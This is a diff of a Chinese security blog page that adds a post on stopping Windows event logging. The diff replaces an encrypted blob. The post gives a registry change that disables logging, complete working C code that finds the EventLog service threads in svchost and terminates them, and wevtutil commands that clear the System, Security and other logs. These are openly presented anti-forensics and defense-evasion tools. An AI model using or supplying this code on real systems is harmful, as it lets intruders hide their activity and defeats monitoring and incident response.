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
-</div>
-<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">
+        <h2 id="方法一-注册表修改永久停止日志记录"><a href="#方法一-注册表修改永久停止日志记录" class="headerlink" title="方法一:注册表修改永久停止日志记录"></a>方法一:注册表修改永久停止日志记录</h2><p>需要注销/重启</p>
+<pre><code>reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MiniNt&quot;
+</code></pre><h2 id="方法二-停止记录日志记录的线程"><a href="#方法二-停止记录日志记录的线程" class="headerlink" title="方法二:停止记录日志记录的线程"></a>方法二:停止记录日志记录的线程</h2><p>思路:<br>tips:需要拥有SeDebugPrivilege权限，不然不能正确执行–&gt;使用powershell管理权限运行即可<br>1.遍历所有进程获取所有进程PID<br>2.获取所有进程名为svchost.exe的进程PID<br>3获取这些进程命令行存在LocalServiceNetworkRestricted字符串的PID<br>4.获取这个PID的所有线程(TID)，获取所有TID的服务名称。是eventlog/EventLog字符串服务名称杀掉线程</p>
+<p>用到的API：<br>枚举所有进程:<br>CreateToolhelp32Snapshot<br>Process32First<br>Process32Next</p>
+<p>x64获取指定进程块(PEB)/TEB信息:<br>ntdll.dll - NtQueryInformationProcess #获取进程块信息<br>ntdll.dll - NtQueryInformationThread #获取线程块信息</p>
+<p>读取内存:<br>ReadProcessMemory</p>
+<p>枚举所有线程:<br>CreateToolhelp32Snapshot<br>Thread32First<br>Thread32Next</p>
+<blockquote>
+<p>获取到进程号之后我们需要识别具体的服务线程，在windows vista之后的系统，具体的服务线程约定使用servicemain作为入口点，同时服务线程自身会带有一个等同于服务名的tag，这个tag可以帮我们识别这个线程是否是我们寻找的，在x64线程teb中0x1720偏移的位置存放着service tag的数字标识<br>我们可以那这个数字标识使用I_QueryTagInformation api查询到具体service tag内容。<br><img src="https://z3.ax1x.com/2021/05/18/gfZg2t.png" alt=""></p>
+</blockquote>
+<p><img src="https://z3.ax1x.com/2021/05/18/gfZs5d.png" alt=""></p>
+<pre><code class="c">#include &quot;stdafx.h&quot;
+#include &lt;Windows.h&gt;
+#include &lt;TlHelp32.h&gt;
+#include &lt;winternl.h&gt;
+#pragma comment(lib, &quot;ntdll.lib&quot;)
+
+
+char *exename = &quot;svchost.exe&quot;;
+typedef struct _CLIENT_ID {
+    HANDLE UniqueProcess;
+    HANDLE UniqueThread;
+} CLIENT_ID;
+typedef NTSTATUS(WINAPI* pNtQueryInformationThread)(HANDLE, THREAD_INFORMATION_CLASS, PVOID, ULONG, PULONG);
+typedef struct _THREAD_BASIC_INFORMATION
+{
+    NTSTATUS    exitStatus;
+    PVOID       pTebBaseAddress;
+    CLIENT_ID   clientId;
+    KAFFINITY               AffinityMask;
+    int                        Priority;
+    int                        BasePriority;
+    int                        v;
+
+
+} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;
+
+
+typedef enum _SC_SERVICE_TAG_QUERY_TYPE
+{
+    ServiceNameFromTagInformation = 1,
+    ServiceNameReferencingModuleInformation,
+    ServiceNameTagMappingInformation,
+} SC_SERVICE_TAG_QUERY_TYPE, *PSC_SERVICE_TAG_QUERY_TYPE;
+
+
+typedef struct _SC_SERVICE_TAG_QUERY
+{
+    ULONG   processId;
+    ULONG   serviceTag;
+    ULONG   reserved;
+    PVOID   pBuffer;
+} SC_SERVICE_TAG_QUERY, *PSC_SERVICE_TAG_QUERY;
+
+
+typedef NTSTATUS(WINAPI *NtQueryInformationProcessFake)(HANDLE, DWORD, PVOID, ULONG, PULONG);
+typedef ULONG(WINAPI* pI_QueryTagInformation)(PVOID, SC_SERVICE_TAG_QUERY_TYPE, PSC_SERVICE_TAG_QUERY);
+#define errorlog(data) {printf(&quot;API Error:%s Code:%d\n&quot;,data,GetLastError());}
+
+
+void EnumProcess();
+void test(int);
+void checkeventlog(CHAR *, int);
+void EnumProcess() {
+    HANDLE hprocesseap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (INVALID_HANDLE_VALUE == hprocesseap) {
+        errorlog(&quot;Funcion EnumProcess---&gt;CreateToolhelp32Snapshot&quot;);
+    }
+    PROCESSENTRY32W pe;
+    pe.dwSize = sizeof(PROCESSENTRY32W);
+    BOOL getlist = Process32First(hprocesseap, &amp;pe);
+    while (getlist)
+    {
+        CHAR processname[100];
+        sprintf(processname, &quot;%ws&quot;, pe.szExeFile);
+        if (strcmp(exename, processname) == 0) {
+            test(pe.th32ProcessID);
+        }
+        getlist = Process32Next(hprocesseap, &amp;pe);
+    }
+}
+
+
+
+
+void test(int pid) {
+    HANDLE target = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    PEB peb = { 0 };
+    PROCESS_BASIC_INFORMATION pbi = { 0 };
+    NtQueryInformationProcessFake NtQueryInformationProcess;
+    RTL_USER_PROCESS_PARAMETERS Param = { 0 };
+    int commandlength = 0;
+
+
+    NtQueryInformationProcess = (NtQueryInformationProcessFake)GetProcAddress(LoadLibrary(L&quot;ntdll.dll&quot;), &quot;NtQueryInformationProcess&quot;);
+    NtQueryInformationProcess(target, 0, (PVOID)&amp;pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);
+    ReadProcessMemory(target, pbi.PebBaseAddress, &amp;peb, sizeof(PEB), NULL);
+    ReadProcessMemory(target, peb.ProcessParameters, &amp;Param, sizeof(RTL_USER_PROCESS_PARAMETERS), NULL);
+    WCHAR *buffer = new WCHAR[Param.CommandLine.Length + 1];
+    ZeroMemory(buffer, (Param.CommandLine.Length + 1) * sizeof(WCHAR));
+    ReadProcessMemory(target, Param.CommandLine.Buffer, buffer, Param.CommandLine.Length, NULL); //获取进程命令行
+    if (wcsstr(buffer, L&quot;LocalServiceNetworkRestricted&quot;)!=NULL) {
+        printf(&quot;PID:%d\n&quot;, pid);
+        checkeventlog(exename, pid);
+    }
+}
+
+
+void checkeventlog(CHAR *name, int pid) {
+    printf(&quot;%s %d\n&quot;, name, pid);
+    pNtQueryInformationThread NtQueryInformationThread = NULL;
+    pI_QueryTagInformation I_QueryTagInformation = NULL;
+    THREADENTRY32 te;
+    THREAD_BASIC_INFORMATION tbi = { 0 };
+    SC_SERVICE_TAG_QUERY tagQuery = { 0 };
+    te.dwSize = sizeof(THREADENTRY32);
+    HANDLE hTag = NULL;
+    NtQueryInformationThread = (pNtQueryInformationThread)GetProcAddress(GetModuleHandle(L&quot;ntdll.dll&quot;), &quot;NtQueryInformationThread&quot;);
+    I_QueryTagInformation = (pI_QueryTagInformation)GetProcAddress(LoadLibrary(L&quot;advapi32.dll&quot;), &quot;I_QueryTagInformation&quot;);
+    HANDLE threads = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (INVALID_HANDLE_VALUE == threads) {
+        errorlog(&quot;checkeventlog---&gt;CreateToolhelp32Snapshot&quot;);
+    }
+    BOOL getlist = Thread32First(threads, &amp;te);
+    while (getlist) {
+        if (te.th32OwnerProcessID == pid) {
+            HANDLE hthread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
+            NtQueryInformationThread(hthread, (THREAD_INFORMATION_CLASS)0, &amp;tbi, 0x30, NULL);
+            HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, te.th32OwnerProcessID);
+            ReadProcessMemory(hprocess, ((PBYTE)tbi.pTebBaseAddress + 0x1720), &amp;hTag, sizeof(HANDLE), NULL);
+            tagQuery.processId = te.th32OwnerProcessID;
+            tagQuery.serviceTag = (ULONG)hTag;
+            I_QueryTagInformation(NULL, ServiceNameFromTagInformation, &amp;tagQuery); //获取线程的服务名称
+            CHAR servicename[MAX_PATH] = { 0 };
+            sprintf(servicename, &quot;%ws&quot;, tagQuery.pBuffer);
+            if (strcmp(servicename, &quot;EventLog&quot;)==0) {
+                printf(&quot;Kill %d %s\n&quot;, te.th32ThreadID, servicename);
+                TerminateThread(hthread, 0);
+            }
+            else if (strcmp(servicename, &quot;eventlog&quot;)==0) {
+                printf(&quot;Kill %d %s\n&quot;, te.th32ThreadID, servicename);
+                TerminateThread(hthread, 0);
+            }
+            tagQuery = { 0 }; //重置线程数组，不然只有一个线程的信息一直刷一样的 -作为一个例子记得写入笔记 (
+        }
+        getlist = Thread32Next(threads, &amp;te);
+    }
+}
+
+
+int main()
+{
+    EnumProcess();
+    system(&quot;pause&quot;);
+    return 0;
+}
+</code></pre>
+<p>Windows7测试:<br><img src="https://z3.ax1x.com/2021/05/18/gfZYCR.png" alt=""></p>
+<p>Windows10测试:<br><img src="https://z3.ax1x.com/2021/05/18/gfZWKf.png" alt=""></p>
+<p>清除windows日志<br>(清除所有日志，但是将生成一个事件ID为1102的日志，用于清除日志)</p>
+<pre><code>wevtutil cl System
+wevtutil cl Application
+wevtutil cl Security
+wevtutil cl Setup
+</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://idiotc4t.com/defense-evasion/fuck-eventlog" target="_blank" rel="noopener">https://idiotc4t.com/defense-evasion/fuck-eventlog</a></p>
+
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
     </div>
@@ -1819,12 +1971,12 @@ U2FsdGVkX19I5YsZtzahSPGhbvlypgaEvCfN5bstLytt1g2sYTpMAaWZZ8Lx079mdg8WjpeHPqL0ngjQ
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Hack The Box - Traverxec</p>
+    <p><span class="copy-title">文章标题:</span>停止windows日志记录研究</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-12-14, 23:46:21</p>
-    <p><span class="copy-title">最后更新:</span>2019-12-15, 00:48:24</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/35f14d3d.html" title="Hack The Box - Traverxec">http://422926799.github.io/posts/35f14d3d.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-05-18, 12:09:39</p>
+    <p><span class="copy-title">最后更新:</span>2021-05-18, 12:19:23</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/c6ff3736.html" title="停止windows日志记录研究">http://422926799.github.io/posts/c6ff3736.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
